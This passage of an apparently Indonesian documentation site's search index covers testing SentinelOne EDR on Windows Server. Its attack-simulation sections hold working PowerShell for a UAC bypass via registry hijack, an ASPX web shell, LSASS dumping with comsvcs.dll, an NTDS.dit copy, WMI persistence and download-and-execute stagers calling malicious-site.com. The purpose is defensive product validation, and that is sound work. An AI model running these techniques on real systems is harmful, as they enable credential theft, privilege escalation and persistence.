offline</li> <li>[ ] WMI Protection: WMI abuse prevented offline</li> <li>[ ] File System Protection: File system activities monitored offline</li> </ul>"},{"location":"testing/windows/windows-offline/#next-steps","title":"Next Steps","text":"<p>Continue with: - Windows Performance Testing - Windows Enterprise Testing - Cross-Platform Offline Scenarios</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"testing/windows/windows-overview/","title":"Windows Server Testing Overview","text":""},{"location":"testing/windows/windows-overview/#overview","title":"Overview","text":"<p>Dokumentasi khusus testing SentinelOne EDR pada platform Windows Server dengan fokus pada environment production, enterprise features, dan Windows-specific security mechanisms.</p>"},{"location":"testing/windows/windows-overview/#windows-server-environment-focus","title":"\ud83c\udfe2 Windows Server Environment Focus","text":""},{"location":"testing/windows/windows-overview/#target-platforms","title":"Target Platforms","text":"<ul> <li>Windows Server 2019 (Standard &amp; Datacenter)</li> <li>Windows Server 2022 (Standard &amp; Datacenter) </li> <li>Windows Server Core (Semi-Annual Channel)</li> <li>Windows Server IoT (Edge scenarios)</li> <li>Hyper-V Server (Virtualization hosts)</li> </ul>"},{"location":"testing/windows/windows-overview/#critical-windows-server-roles","title":"Critical Windows Server Roles","text":"<ul> <li>Active Directory Domain Services (AD DS)</li> <li>Internet Information Services (IIS)</li> <li>SQL Server (Database services)</li> <li>Exchange Server (Email services)</li> <li>File Services (SMB/CIFS shares)</li> <li>DNS Server (Name resolution)</li> <li>DHCP Server (Network services)</li> </ul>"},{"location":"testing/windows/windows-overview/#windows-specific-security-testing","title":"\ud83d\udd10 Windows-Specific Security Testing","text":""},{"location":"testing/windows/windows-overview/#windows-security-architecture-integration","title":"Windows Security Architecture Integration","text":""},{"location":"testing/windows/windows-overview/#windows-defender-integration","title":"Windows Defender Integration","text":"<pre><code># Test Windows Defender coexistence\nWrite-Host \"=== WINDOWS DEFENDER INTEGRATION TESTING ===\" -ForegroundColor Cyan\n\n# Check Windows Security Center status\n$defenderStatus = Get-MpComputerStatus\nWrite-Host \"Windows Defender Status:\"\nWrite-Host \"- Antimalware Enabled: $($defenderStatus.AMServiceEnabled)\"\nWrite-Host \"- Real-time Protection: $($defenderStatus.RealTimeProtectionEnabled)\"\nWrite-Host \"- Behavior Monitor: $($defenderStatus.BehaviorMonitorEnabled)\"\nWrite-Host \"- Tamper Protection: $($defenderStatus.TamperProtectionEnabled)\"\n\n# Check if SentinelOne is registered as primary AV\n$avProducts = Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Class AntiVirusProduct\nforeach($product in $avProducts) {\n    $productName = $product.displayName\n    $productState = $product.productState\n    Write-Host \"AV Product: $productName (State: $productState)\"\n\n    if($productName -like \"*Sentinel*\") {\n        Write-Host \"\u2705 SentinelOne registered in Security Center\" -ForegroundColor Green\n    }\n}\n\n# Test exclusion coordination\nif(Get-Command Get-MpPreference -ErrorAction SilentlyContinue) {\n    $exclusions = Get-MpPreference\n    Write-Host \"Windows Defender Exclusions:\"\n    $exclusions.ExclusionPath | ForEach-Object { Write-Host \"- Path: $_\" }\n}\n</code></pre>"},{"location":"testing/windows/windows-overview/#uac-and-privilege-escalation-testing","title":"UAC and Privilege Escalation Testing","text":"<pre><code># Advanced UAC bypass testing specific to Windows Server\nWrite-Host \"=== WINDOWS SERVER UAC BYPASS TESTING ===\" -ForegroundColor Cyan\n\n# Test Server-specific UAC bypass methods\n$uacBypassTests = @(\n    @{Name=\"CompMgmtLauncher\"; Path=\"C:\\Windows\\System32\\CompMgmtLauncher.exe\"},\n    @{Name=\"ServerManager\"; Path=\"C:\\Windows\\System32\\ServerManager.exe\"},\n    @{Name=\"SystemPropertiesAdvanced\"; Path=\"C:\\Windows\\System32\\SystemPropertiesAdvanced.exe\"}\n)\n\nforeach($test in $uacBypassTests) {\n    Write-Host \"Testing UAC bypass via: $($test.Name)\"\n\n    # Attempt registry hijack for UAC bypass\n    $regPath = \"HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\"\n    try {\n        New-Item -Path $regPath -Force | Out-Null\n        Set-ItemProperty -Path $regPath -Name \"(default)\" -Value \"cmd.exe /c echo UAC_BYPASS_SUCCESS &gt; C:\\temp\\uac_test.txt\"\n\n        # Launch the executable that should trigger UAC bypass\n        Start-Process $test.Path -WindowStyle Hidden\n        Start-Sleep -Seconds 5\n\n        if(Test-Path \"C:\\temp\\uac_test.txt\") {\n            Write-Host \"\u274c UAC BYPASS SUCCESSFUL - SECURITY RISK!\" -ForegroundColor Red\n            Remove-Item \"C:\\temp\\uac_test.txt\" -Force\n        } else {\n            Write-Host \"\u2705 UAC bypass prevented\" -ForegroundColor Green\n        }\n\n        # Clean up registry\n        Remove-Item -Path $regPath -Force -ErrorAction SilentlyContinue\n    }\n    catch {\n        Write-Host \"\u2705 Registry modification blocked\" -ForegroundColor Green\n    }\n}\n</code></pre>"},{"location":"testing/windows/windows-overview/#windows-service-protection","title":"Windows Service Protection","text":"<pre><code># Test Windows service tampering protection\nWrite-Host \"=== WINDOWS SERVICE PROTECTION TESTING ===\" -ForegroundColor Cyan\n\n$criticalServices = @(\"SentinelAgent\", \"SentinelHelperService\", \"SentinelStaticEngine\")\n\nforeach($serviceName in $criticalServices) {\n    $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue\n    if($service) {\n        Write-Host \"Testing protection for service: $serviceName\"\n\n        # Test service stop attempts\n        try {\n            Stop-Service -Name $serviceName -Force -ErrorAction Stop\n            Write-Host \"\u274c Service $serviceName was stopped!\" -ForegroundColor Red\n        }\n        catch {\n            Write-Host \"\u2705 Service stop blocked for $serviceName\" -ForegroundColor Green\n        }\n\n        # Test service deletion attempts\n        try {\n            sc.exe delete $serviceName\n            Write-Host \"\u274c Service $serviceName was deleted!\" -ForegroundColor Red\n        }\n        catch {\n            Write-Host \"\u2705 Service deletion blocked for $serviceName\" -ForegroundColor Green\n        }\n\n        # Test service configuration modification\n        try {\n            sc.exe config $serviceName start= disabled\n            Write-Host \"\u274c Service configuration modified!\" -ForegroundColor Red\n        }\n        catch {\n            Write-Host \"\u2705 Service configuration protected\" -ForegroundColor Green\n        }\n    }\n}\n</code></pre>"},{"location":"testing/windows/windows-overview/#windows-server-roles-testing","title":"\ud83d\udcbe Windows Server Roles Testing","text":""},{"location":"testing/windows/windows-overview/#iis-web-server-protection","title":"IIS Web Server Protection","text":"<pre><code># Test IIS-specific protection scenarios\nWrite-Host \"=== IIS WEB SERVER PROTECTION TESTING ===\" -ForegroundColor Cyan\n\n# Check if IIS is installed\n$iisFeature = Get-WindowsFeature -Name \"IIS-WebServerRole\"\nif($iisFeature.InstallState -eq \"Installed\") {\n    Write-Host \"\u2705 IIS Web Server Role detected\" -ForegroundColor Green\n\n    # Test web shell upload protection\n    $webRoot = \"C:\\inetpub\\wwwroot\"\n    $webShellContent = @'\n&lt;%@ Page Language=\"C#\" %&gt;\n&lt;%@ Import Namespace=\"System.IO\" %&gt;\n&lt;script runat=\"server\"&gt;\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        if (Request[\"cmd\"] != null)\n        {\n            Response.Write(\"&lt;pre&gt;\");\n            Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"cmd\"]).StandardOutput.ReadToEnd());\n            Response.Write(\"&lt;/pre&gt;\");\n        }\n    }\n&lt;/script&gt;\n'@\n\n    try {\n        $webShellPath = Join-Path $webRoot \"test_webshell.aspx\"\n        $webShellContent | Out-File -FilePath $webShellPath -Encoding UTF8\n\n        if(Test-Path $webShellPath) {\n            Write-Host \"\u274c Web shell upload successful - CRITICAL RISK!\" -ForegroundColor Red\n            Remove-Item $webShellPath -Force\n        }\n    }\n    catch {\n        Write-Host \"\u2705 Web shell upload blocked\" -ForegroundColor Green\n    }\n\n    # Test IIS configuration tampering\n    try {\n        $configPath = \"$env:SystemRoot\\System32\\inetsrv\\config\\applicationHost.config\"\n        Add-Content -Path $configPath -Value \"&lt;!-- Test modification --&gt;\"\n        Write-Host \"\u274c IIS configuration modified!\" -ForegroundColor Red\n    }\n    catch {\n        Write-Host \"\u2705 IIS configuration protected\" -ForegroundColor Green\n    }\n\n} else {\n    Write-Host \"\u26aa IIS Web Server Role not installed\" -ForegroundColor Gray\n}\n</code></pre>"},{"location":"testing/windows/windows-overview/#sql-server-protection-testing","title":"SQL Server Protection Testing","text":"<pre><code># Test SQL Server protection scenarios\nWrite-Host \"=== SQL SERVER PROTECTION TESTING ===\" -ForegroundColor Cyan\n\n# Check for SQL Server instances\n$sqlServices = Get-Service -Name \"MSSQL*\" -ErrorAction SilentlyContinue\nif($sqlServices) {\n    Write-Host \"\u2705 SQL Server instances detected:\" -ForegroundColor Green\n    $sqlServices | ForEach-Object { Write-Host \"  - $($_.Name): $($_.Status)\" }\n\n    # Test SQL Server service tampering\n    foreach($service in $sqlServices) {\n        try {\n            Stop-Service -Name $service.Name -Force -ErrorAction Stop\n            Write-Host \"\u274c SQL Server service $($service.Name) stopped!\" -ForegroundColor Red\n        }\n        catch {\n            Write-Host \"\u2705 SQL Server service $($service.Name) protected\" -ForegroundColor Green\n        }\n    }\n\n    # Test SQL Server file protection\n    $sqlPaths = @(\n        \"C:\\Program Files\\Microsoft SQL Server\",\n        \"C:\\Program Files (x86)\\Microsoft SQL Server\"\n    )\n\n    foreach($path in $sqlPaths) {\n        if(Test-Path $path) {\n            Write-Host \"Testing SQL Server file protection: $path\"\n\n            try {\n                $testFile = Join-Path $path \"malicious_test.exe\"\n                \"malicious content\" | Out-File -FilePath $testFile\n\n                if(Test-Path $testFile) {\n                    Write-Host \"\u274c File creation in SQL Server directory!\" -ForegroundColor Red\n                    Remove-Item $testFile -Force\n                }\n            }\n            catch {\n                Write-Host \"\u2705 SQL Server directory protected\" -ForegroundColor Green\n            }\n        }\n    }\n\n} else {\n    Write-Host \"\u26aa No SQL Server instances detected\" -ForegroundColor Gray\n}\n</code></pre>"},{"location":"testing/windows/windows-overview/#active-directory-protection","title":"Active Directory Protection","text":"<pre><code># Test Active Directory specific protection\nWrite-Host \"=== ACTIVE DIRECTORY PROTECTION TESTING ===\" -ForegroundColor Cyan\n\n# Check if this is a Domain Controller\n$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -in @(4,5)\nif($isDC) {\n    Write-Host \"\u2705 Domain Controller detected\" -ForegroundColor Green\n\n    # Test NTDS.dit protection\n    $ntdsPath = \"$env:SystemRoot\\NTDS\\ntds.dit\"\n    if(Test-Path $ntdsPath) {\n        try {\n            Copy-Item $ntdsPath \"C:\\temp\\stolen_ntds.dit\" -ErrorAction Stop\n            Write-Host \"\u274c NTDS.dit copied - CRITICAL BREACH!\" -ForegroundColor Red\n            Remove-Item \"C:\\temp\\stolen_ntds.dit\" -Force\n        }\n        catch {\n            Write-Host \"\u2705 NTDS.dit access blocked\" -ForegroundColor Green\n        }\n    }\n\n    # Test LSASS dumping attempts\n    try {\n        $lsassProcess = Get-Process lsass\n        $dumpPath = \"C:\\temp\\lsass.dmp\"\n        rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump $lsassProcess.Id $dumpPath full\n\n        if(Test-Path $dumpPath) {\n            Write-Host \"\u274c LSASS dump successful - CRITICAL BREACH!\" -ForegroundColor Red\n            Remove-Item $dumpPath -Force\n        }\n    }\n    catch {\n        Write-Host \"\u2705 LSASS dumping blocked\" -ForegroundColor Green\n    }\n\n    # Test DCSync attack simulation\n    Write-Host \"Testing DCSync attack protection...\"\n    # This would require more complex testing with tools like Mimikatz\n    # For demo purposes, we'll test basic LDAP query restrictions\n\n} else {\n    Write-Host \"\u26aa Not a Domain Controller\" -ForegroundColor Gray\n}\n</code></pre>"},{"location":"testing/windows/windows-overview/#windows-event-log-integration","title":"\ud83d\udd0d Windows Event Log Integration","text":""},{"location":"testing/windows/windows-overview/#security-event-monitoring","title":"Security Event Monitoring","text":"<pre><code># Test Windows Event Log integration\nWrite-Host \"=== WINDOWS EVENT LOG INTEGRATION ===\" -ForegroundColor Cyan\n\n# Create test security events\ntry {\n    # Generate failed logon event\n    $cred = New-Object System.Management.Automation.PSCredential(\"fake_user\", (ConvertTo-SecureString \"fake_pass\" -AsPlainText -Force))\n    Start-Process powershell.exe -Credential $cred -WindowStyle Hidden -ErrorAction SilentlyContinue\n}\ncatch {\n    # Expected to fail, generating security event\n}\n\n# Check if SentinelOne is capturing Windows security events\nStart-Sleep -Seconds 10\n\n# Query recent security events\n$securityEvents = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625; StartTime=(Get-Date).AddMinutes(-5)} -MaxEvents 5 -ErrorAction SilentlyContinue\n\nif($securityEvents) {\n    Write-Host \"\u2705 Security events detected:\" -ForegroundColor Green\n    $securityEvents | ForEach-Object {\n        Write-Host \"  - Event ID: $($_.Id), Time: $($_.TimeCreated)\" -ForegroundColor Gray\n    }\n} else {\n    Write-Host \"\u26aa No recent security events found\" -ForegroundColor Gray\n}\n\n# Test custom event log creation for SentinelOne\ntry {\n    New-EventLog -LogName \"SentinelOne\" -Source \"SentinelOneTest\" -ErrorAction Stop\n    Write-EventLog -LogName \"SentinelOne\" -Source \"SentinelOneTest\" -EventId 1001 -Message \"SentinelOne integration test event\"\n    Write-Host \"\u2705 Custom SentinelOne event log created\" -ForegroundColor Green\n}\ncatch {\n    Write-Host \"\u26aa Custom event log creation failed or already exists\" -ForegroundColor Gray\n}\n</code></pre>"},{"location":"testing/windows/windows-overview/#windows-performance-counters","title":"\ud83d\udcca Windows Performance Counters","text":""},{"location":"testing/windows/windows-overview/#windows-specific-performance-monitoring","title":"Windows-Specific Performance Monitoring","text":"<pre><code># Monitor Windows-specific performance counters\nWrite-Host \"=== WINDOWS PERFORMANCE COUNTERS ===\" -ForegroundColor Cyan\n\n$performanceCounters = @(\n    \"\\Processor(_Total)\\% Processor Time\",\n    \"\\Memory\\Available MBytes\",\n    \"\\LogicalDisk(C:)\\% Free Space\",\n    \"\\Network Interface(*)\\Bytes Total/sec\",\n    \"\\System\\Processes\",\n    \"\\System\\Threads\"\n)\n\n$sentinelCounters = @()\n\n# Get baseline performance\nforeach($counter in $performanceCounters) {\n    try {\n        $counterValue = (Get-Counter -Counter $counter -SampleInterval 1 -MaxSamples 1).CounterSamples.CookedValue\n        Write-Host \"$counter : $([math]::Round($counterValue, 2))\"\n    }\n    catch {\n        Write-Host \"$counter : Unable to retrieve\"\n    }\n}\n\n# Monitor SentinelOne specific processes\n$sentinelProcesses = Get-Process -Name \"*Sentinel*\" -ErrorAction SilentlyContinue\nif($sentinelProcesses) {\n    Write-Host \"`nSentinelOne Process Performance:\"\n    foreach($process in $sentinelProcesses) {\n        $cpu = $process.CPU\n        $memory = [math]::Round($process.WorkingSet / 1MB, 2)\n        $handles = $process.Handles\n        Write-Host \"- $($process.ProcessName): CPU=$cpu, Memory=$memory MB, Handles=$handles\"\n    }\n}\n</code></pre>"},{"location":"testing/windows/windows-overview/#windows-specific-attack-simulations","title":"\ud83e\uddea Windows-Specific Attack Simulations","text":""},{"location":"testing/windows/windows-overview/#powershell-attack-vectors","title":"PowerShell Attack Vectors","text":"<pre><code># Test PowerShell-based attack detection\nWrite-Host \"=== POWERSHELL ATTACK SIMULATION ===\" -ForegroundColor Cyan\n\n# Test encoded command detection\n$maliciousCommand = \"Write-Host 'This is a test malicious command'\"\n$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($maliciousCommand))\n\ntry {\n    powershell.exe -EncodedCommand $encodedCommand -WindowStyle Hidden\n    Write-Host \"\u274c Encoded PowerShell command executed\" -ForegroundColor Red\n}\ncatch {\n    Write-Host \"\u2705 Encoded PowerShell command blocked\" -ForegroundColor Green\n}\n\n# Test PowerShell download and execute\n$downloadCommand = \"Invoke-WebRequest -Uri 'http://malicious-site.com/payload.ps1' -OutFile 'C:\\temp\\payload.ps1'; &amp; 'C:\\temp\\payload.ps1'\"\ntry {\n    Invoke-Expression $downloadCommand\n    Write-Host \"\u274c Download and execute succeeded\" -ForegroundColor Red\n}\ncatch {\n    Write-Host \"\u2705 Download and execute blocked\" -ForegroundColor Green\n}\n\n# Test PowerShell Empire-style commands\n$empireCommand = @\"\n`$client = New-Object System.Net.WebClient;\n`$client.DownloadString('http://malicious-site.com/stager')\n\"@\n\ntry {\n    Invoke-Expression $empireCommand\n    Write-Host \"\u274c Empire-style command executed\" -ForegroundColor Red\n}\ncatch {\n    Write-Host \"\u2705 Empire-style command blocked\" -ForegroundColor Green\n}\n</code></pre>"},{"location":"testing/windows/windows-overview/#wmi-persistence-testing","title":"WMI Persistence Testing","text":"<pre><code># Test WMI-based persistence detection\nWrite-Host \"=== WMI PERSISTENCE TESTING ===\" -ForegroundColor Cyan\n\n$filterName = \"SentinelTestFilter\"\n$consumerName = \"SentinelTestConsumer\"\n\ntry {\n    # Create WMI Event Filter\n    $filterQuery = \"SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2\"\n    $filter = Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{\n        Name = $filterName\n        EventNameSpace = \"root\\cimv2\"\n        QueryLanguage = \"WQL\"\n        Query = $filterQuery\n    }\n\n    # Create WMI Event Consumer\n    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{\n        Name = $consumerName\n        CommandLineTemplate = \"cmd.exe /c echo WMI_PERSISTENCE_TEST &gt; C:\\temp\\wmi_test.txt\"\n    }\n\n    # Create WMI Binding\n    $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\\subscription\" -Arguments @{\n        Filter = $filter\n        Consumer = $consumer\n    }\n\n    Write-Host \"\u274c WMI persistence created successfully - SECURITY RISK!\" -ForegroundColor Red\n\n    # Clean up\n    Remove-WmiObject -Path $binding.__PATH\n    Remove-WmiObject -Path $consumer.__PATH  \n    Remove-WmiObject -Path $filter.__PATH\n\n}\ncatch {\n    Write-Host \"\u2705 WMI persistence creation blocked\" -ForegroundColor Green\n}\n</code></pre>"},{"location":"testing/windows/windows-overview/#windows-testing-checklist","title":"\ud83d\udcdd Windows Testing Checklist","text":""},{"location":"testing/windows/windows-overview/#pre-demo-preparation","title":"Pre-Demo Preparation","text":"<ul> <li>[ ] Windows Server Environment Ready</li> <li>[ ] Domain controller configured (if testing AD integration)</li> <li>[ ] IIS installed (if testing web server protection)</li> <li>[ ] SQL Server installed (if testing database protection)</li> <li> <p>[ ] Network connectivity verified</p> </li> <li> <p>[ ] SentinelOne Agent Deployed</p> </li> <li>[ ] Agent installed with latest version</li> <li>[ ] Connected to management console</li> <li>[ ] Policy applied and active</li> <li> <p>[ ] Baseline performance captured</p> </li> <li> <p>[ ] Testing Tools Prepared</p> </li> <li>[ ] PowerShell execution policy configured</li> <li>[ ] Test files and scripts ready</li> <li>[ ] EICAR test files prepared</li> <li>[ ] Monitoring tools configured</li> </ul>"},{"location":"testing/windows/windows-overview/#demo-execution-checklist","title":"Demo Execution Checklist","text":"<ul> <li>[ ] Real-time Protection Demo</li> <li>[ ] EICAR detection test</li> <li>[ ] Malicious PowerShell blocking</li> <li>[ ] Process injection prevention</li> <li> <p>[ ] Registry tampering protection</p> </li> <li> <p>[ ] Offline Scenario Demo</p> </li> <li>[ ] Network disconnection simulation</li> <li>[ ] Offline threat detection</li> <li>[ ] Uninstall protection testing</li> <li> <p>[ ] Service recovery validation</p> </li> <li> <p>[ ] Enterprise Integration Demo</p> </li> <li>[ ] Active Directory authentication</li> <li>[ ] Windows Event Log integration</li> <li>[ ] Performance counter monitoring</li> <li>[ ] SIEM log forwarding</li> </ul>"},{"location":"testing/windows/windows-overview/#success-metrics","title":"Success Metrics","text":"<ul> <li>[ ] Protection Effectiveness: &gt;99% threat blocking rate</li> <li>[ ] Performance Impact: &lt;5% CPU overhead, &lt;500MB RAM usage</li> <li>[ ] Integration Quality: Seamless AD/IIS/SQL Server operation</li> <li>[ ] Tamper Resistance: 100% uninstall attempt prevention</li> <li>[ ] Event Logging: Complete audit trail maintained</li> </ul>"},{"location":"testing/windows/windows-overview/#next-steps","title":"Next Steps","text":"<p>Continue with specific Windows testing scenarios: - Windows Offline Testing - Windows Performance Testing  - Windows Enterprise Integration</p> <p>Windows Server Ready</p> <p>Comprehensive Windows Server testing framework prepared for executive demonstration. All critical Windows-specific scenarios covered with detailed validation procedures.</p>"},{"location":"testing/windows/windows-performance/","title":"Windows Performance Testing Scenarios","text":""},{"location":"testing/windows/windows-performance/#overview","title":"Overview","text":"<p>Pengujian komprehensif dampak performa SentinelOne EDR terhadap sistem Windows Server dalam berbagai skenario beban kerja.</p>"},{"location":"testing/windows/windows-performance/#performance-testing-architecture","title":"\ud83c\udfaf Performance Testing Architecture","text":"<pre><code>flowchart TB\n    subgraph \"Windows Performance Stack\"\n        PERFMON[\"Performance Monitor&lt;br/&gt;perfmon.exe\"]\n        TASKMGR[\"Task Manager&lt;br/&gt;Resource Monitor\"]\n        POWERSHELL[\"PowerShell Counters&lt;br/&gt;Get-Counter\"]\n        WMI[\"WMI Performance&lt;br/&gt;Win32_Processor\"]\n    end\n\n    subgraph \"Windows System Under Test\"\n        CPU[\"CPU Performance&lt;br/&gt;Multi-core Testing\"]\n        MEMORY[\"Memory Usage&lt;br/&gt;RAM &amp; Page File\"]\n        DISK[\"Disk I/O&lt;br/&gt;NTFS Operations\"]\n        NETWORK[\"Network Throughput&lt;br/&gt;TCP/UDP Windows\"]\n    end\n\n    subgraph \"SentinelOne Agent\"\n        AGENT_CPU[\"Agent CPU Usage&lt;br/&gt;Real-time Scanning\"]\n        AGENT_MEM[\"Agent Memory&lt;br/&gt;Working Set Analysis\"]\n        AGENT_IO[\"Agent Disk I/O&lt;br/&gt;NTFS Log Files\"]\n        AGENT_NET[\"Agent Network&lt;br/&gt;HTTPS Telemetry\"]\n    end\n\n    PERFMON --&gt; CPU\n    PERFMON --&gt; MEMORY\n    PERFMON --&gt; DISK\n    PERFMON --&gt; NETWORK\n\n    TASKMGR --&gt; CPU\n    POWERSHELL --&gt; MEMORY\n    WMI --&gt; CPU\n\n    CPU -.-&gt; AGENT_CPU\n    MEMORY -.-&gt; AGENT_MEM\n    DISK -.-&gt; AGENT_IO\n    NETWORK -.-&gt; AGENT_NET\n\n    style PERFMON fill:#e3f2fd\n    style AGENT_CPU fill:#fff3e0\n    style AGENT_MEM fill:#e8f5e8\n    style AGENT_IO fill:#fce4ec\n    style AGENT_NET fill:#f3e5f5</code></pre>"},{"location":"testing/windows/windows-performance/#e1-cpu-performance-testing","title":"\ud83d\udcca E1: CPU Performance Testing","text":""},{"location":"testing/windows/windows-performance/#e11-baseline-cpu-performance-measurement","title":"E1.1: Baseline CPU Performance Measurement","text":"<pre><code># Windows CPU Performance Baseline Test\nWrite-Host \"=== Windows CPU Performance Baseline Test ===\" -ForegroundColor Green\n\n# System information\nWrite-Host \"System Information:\" -ForegroundColor Yellow\nGet-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, TotalPhysicalMemory\nGet-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors\n\n# Install tools if needed (using Chocolatey)\nfunction Install-Tools {\n    if (-not (Get-Command sysbench -ErrorAction SilentlyContinue)) {\n        Write-Host \"Installing sysbench via Chocolatey...\" -ForegroundColor Yellow\n        if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {\n            Write-Host \"Please install Chocolatey first: https://chocolatey.org/install\"\n            return\n        }\n        choco install sysbench -y\n    }\n}\n\nInstall-Tools\n\n# CPU benchmark without SentinelOne (if not installed)\nWrite-Host \"=== CPU Benchmark Results ===\" -ForegroundColor Yellow\n$cores = (Get-WmiObject -Class Win32_Processor).NumberOfLogicalProcessors\nsysbench cpu --cpu-max-prime=20000 --threads=$cores run\n\n# PowerShell CPU stress test\nWrite-Host \"=== PowerShell CPU Stress Test (60 seconds) ===\" -ForegroundColor Yellow\n$jobs = @()\nfor ($i = 1; $i -le $cores; $i++) {\n    $jobs += Start-Job -ScriptBlock {\n        $start = Get-Date\n        while ((Get-Date) -lt $start.AddSeconds(60)) {\n            $result = 0\n            for ($j = 1; $j -le 1000; $j++) {\n                $result += $j * $j\n            }\n        }\n    }\n}\n\n# Monitor CPU during stress test\n$start = Get-Date\nwhile ((Get-Date) -lt $start.AddSeconds(65)) {\n    $cpu = Get-Counter \"\\Processor(_Total)\\% Processor Time\" -SampleInterval 1 -MaxSamples 1\n    Write-Host \"CPU Usage: $([math]::Round(100 - $cpu.CounterSamples[0].CookedValue, 2))%\"\n    Start-Sleep 5\n}\n\n# Cleanup jobs\n$jobs | Remove-Job -Force\n</code></pre>"},{"location":"testing/windows/windows-performance/#e12-cpu-performance-with-sentinelone-agent","title":"E1.2: CPU Performance with SentinelOne Agent","text":"<pre><code># Windows CPU Performance with SentinelOne Agent\nWrite-Host \"=== CPU Performance with SentinelOne Agent ===\" -ForegroundColor Green\n\n# Check SentinelOne agent status\nWrite-Host \"SentinelOne Agent Status:\" -ForegroundColor Yellow\n&amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" status\n\n# Monitor SentinelOne CPU usage during stress test\n$monitoringJob = Start-Job -ScriptBlock {\n    while ($true) {\n        $sentinelProcesses = Get-Process | Where-Object {$_.ProcessName -like \"*Sentinel*\"}\n        $totalCpu = ($sentinelProcesses | Measure-Object CPU -Sum).Sum\n        $timestamp = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\n        Write-Output \"$timestamp - SentinelOne Total CPU: $totalCpu seconds\"\n        Start-Sleep 5\n    }\n}\n\n# Run CPU benchmark with agent active\nWrite-Host \"=== CPU Benchmark with SentinelOne Active ===\" -ForegroundColor Yellow\n$cores = (Get-WmiObject -Class Win32_Processor).NumberOfLogicalProcessors\nsysbench cpu --cpu-max-prime=20000 --threads=$cores run\n\n# Stop monitoring\n$monitoringJob | Stop-Job\n$monitoringJob | Receive-Job\n$monitoringJob | Remove-Job\n\n# Compare results\nWrite-Host \"=== Performance Impact Analysis ===\" -ForegroundColor Yellow\nWrite-Host \"Compare CPU benchmark results between baseline and with-agent tests\"\n</code></pre>"},{"location":"testing/windows/windows-performance/#e13-real-time-cpu-impact-during-file-operations","title":"E1.3: Real-time CPU Impact During File Operations","text":"<pre><code># Real-time CPU monitoring during file operations\nWrite-Host \"=== CPU Impact During File Operations ===\" -ForegroundColor Green\n\n# Function to create large files for scanning\nfunction Create-TestFiles {\n    Write-Host \"Creating test files for real-time scanning...\" -ForegroundColor Yellow\n    New-Item -Path \"C:\\temp\\performance_test\" -ItemType Directory -Force\n\n    # Create various file types\n    $randomBytes = New-Object byte[] (100MB)\n    (New-Object System.Random).NextBytes($randomBytes)\n    [System.IO.File]::WriteAllBytes(\"C:\\temp\\performance_test\\binary_file.bin\", $randomBytes)\n\n    # Create zero-filled file\n    fsutil file createnew \"C:\\temp\\performance_test\\zero_file.dat\" 104857600  # 100MB\n\n    # Create text files\n    for ($i = 1; $i -le 50; $i++) {\n        Get-EventLog -LogName System -Newest 1000 | Out-File \"C:\\temp\\performance_test\\text_file_$i.txt\"\n    }\n\n    # Create executable files\n    Copy-Item -Path \"C:\\Windows\\System32\\calc.exe\" -Destination \"C:\\temp\\performance_test\\test_executable.exe\"\n}\n\n# Start CPU monitoring\n$cpuCounter = \"\\Processor(_Total)\\% Processor Time\"\n$monitoringJob = Start-Job -ScriptBlock {\n    param($counter)\n    for ($i = 1; $i -le 60; $i++) {\n        $cpu = Get-Counter $counter -SampleInterval 1 -MaxSamples 1\n        $usage = [math]::Round(100 - $cpu.CounterSamples[0].CookedValue, 2)\n        $timestamp = Get-Date -Format \"HH:mm:ss\"\n        Write-Output \"$timestamp - System CPU: $usage%\"\n    }\n} -ArgumentList $cpuCounter\n\n# Create files (will trigger real-time scanning)\nCreate-TestFiles\n\n# Wait for monitoring to complete\n$monitoringJob | Wait-Job\n$results = $monitoringJob | Receive-Job\n$monitoringJob | Remove-Job\n\n# Display results\nWrite-Host \"CPU usage during file operations:\" -ForegroundColor Yellow\n$results\n\n# Cleanup\nRemove-Item -Path \"C:\\temp\\performance_test\" -Recurse -Force -ErrorAction SilentlyContinue\n</code></pre>"},{"location":"testing/windows/windows-performance/#e2-memory-performance-testing","title":"\ud83e\udde0 E2: Memory Performance Testing","text":""},{"location":"testing/windows/windows-performance/#e21-memory-footprint-analysis","title":"E2.1: Memory Footprint Analysis","text":"<pre><code># Windows Memory footprint analysis\nWrite-Host \"=== Memory Footprint Analysis ===\" -ForegroundColor Green\n\n# System memory information\nWrite-Host \"System Memory Information:\" -ForegroundColor Yellow\n$memory = Get-WmiObject -Class Win32_ComputerSystem\n$memoryGB = [math]::Round($memory.TotalPhysicalMemory / 1GB, 2)\nWrite-Host \"Total Physical Memory: $memoryGB GB\"\n\nGet-Counter \"\\Memory\\Available MBytes\", \"\\Memory\\Committed Bytes\" | \n    Select-Object -ExpandProperty CounterSamples | \n    Format-Table Path, @{Name=\"Value\"; Expression={[math]::Round($_.CookedValue/1MB, 2)}}\n\n# SentinelOne agent memory usage\nWrite-Host \"=== SentinelOne Agent Memory Usage ===\" -ForegroundColor Yellow\n$sentinelProcesses = Get-Process | Where-Object {$_.ProcessName -like \"*Sentinel*\"}\n$sentinelProcesses | Select-Object ProcessName, \n    @{Name=\"WorkingSet(MB)\"; Expression={[math]::Round($_.WorkingSet/1MB, 2)}}, \n    @{Name=\"VirtualMemory(MB)\"; Expression={[math]::Round($_.VirtualMemorySize/1MB, 2)}}, \n    @{Name=\"PrivateMemory(MB)\"; Expression={[math]::Round($_.PrivateMemorySize/1MB, 2)}} | \n    Format-Table\n\n# Total SentinelOne memory usage\n$totalWorkingSet = ($sentinelProcesses | Measure-Object WorkingSet -Sum).Sum / 1MB\n$totalVirtual = ($sentinelProcesses | 